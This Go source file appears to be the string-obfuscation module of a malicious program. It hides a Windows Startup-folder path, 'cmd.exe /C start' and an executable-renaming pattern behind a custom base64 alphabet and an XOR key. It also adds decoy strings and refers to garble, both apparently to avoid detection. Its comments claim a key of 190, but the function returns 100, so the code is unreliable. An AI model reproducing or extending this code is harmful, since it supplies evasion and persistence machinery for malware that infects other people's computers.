package main

import (
	"bytes"
	"strings"
)

const (
	base64Chars = "rJw24X3UecVPWtu9+QhILpkMfv8G/DNE1baRdSTZqoH0CFm5ynxgAsB76zYlOijK"

	// Windows constants
	WIN_STARTUP_FOLDER_FORMATTER       = "cs66WQ/JXb/6+Q/6cQ+LerL+JI1BwyLc2+q2uwdtJnfPXyCw421g2+qrwnWMu2/+JQf+QwdJwb46tJfPrnfXwQ/6tnrXXbrQXr=="
	WIN_DEBUG_STARTUP_FOLDER_FORMATTER = "cs66WQ/JXb/6+Q/6erCIw11PJ+rMuwe0Pxf0VhflWwdA"
	CMD_EXE                            = "Jydrh14/r+==" // cmd.exe
	START                              = "XnrXXbr="     // start
	_C                                 = "hx/="         // /C

	// Linux doesn't need obfuscated strings (It will be handled by garble)

	// Generic
	FOK                = "r1C9"         // fok
	NEW_NAME_FORMATTER = "+QDV++JVrQyJ" // %s.%d.exe

	// Just to take up space
	BLANK  = "Hello, World!"
	BLANK2 = "Please enter a valid plate number, or press 'exit'"
)

// ? StringToBase64
// ! Not used in release builds
func stb64(input string) string {
	result := ""
	for i := 0; i < len(input); i += 3 {
		chunk := input[i:min(i+3, len(input))]
		b1, b2, b3 := chunk[0], byte(0), byte(0)
		if len(chunk) > 1 {
			b2 = chunk[1]
		}
		if len(chunk) > 2 {
			b3 = chunk[2]
		}
		result += string(base64Chars[b1>>2])
		result += string(base64Chars[((b1&0x03)<<4)|(b2>>4)])
		if len(chunk) > 1 {
			result += string(base64Chars[((b2&0x0F)<<2)|(b3>>6)])
		} else {
			result += "="
		}
		if len(chunk) > 2 {
			result += string(base64Chars[b3&0x3F])
		} else {
			result += "="
		}
	}
	return result
}

// ? BaseToString64
func bts64(input string) string {
	result := ""
	for i := 0; i < len(input); i += 4 {
		chunk := input[i:min(i+4, len(input))]
		b1 := strings.IndexByte(base64Chars, chunk[0])
		b2 := strings.IndexByte(base64Chars, chunk[1])
		b3 := strings.IndexByte(base64Chars, chunk[2])
		b4 := strings.IndexByte(base64Chars, chunk[3])
		result += string((b1 << 2) | (b2 >> 4))
		if chunk[2] != '=' {
			result += string(((b2 & 0x0F) << 4) | (b3 >> 2))
		}
		if chunk[3] != '=' {
			result += string(((b3 & 0x03) << 6) | b4)
		}
	}
	return result
}

// ? Outputs 190, which is used as the key for string obfuscation
func k() byte {
	var sb bytes.Buffer

	var i byte = 0
	for ; i < 100; i++ {
		sb.WriteByte(i)
	}

	return byte(len(sb.String()))
}

// ? A method that does an XOR on a string, using k()->[190]
func _obf(s string) string {
	k := k()
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		result[i] = byte(s[i] ^ k)
	}

	return string(result)
}

// ? Obfuscates a string using base64 and k()->[190]
// ! Not used in release builds
func obf(s string) string {
	return stb64(_obf(s))
}

// ? Deobfuscates a string using base64 and k()->[190]
func getStr(s string) string {
	return _obf(bts64(s))
}
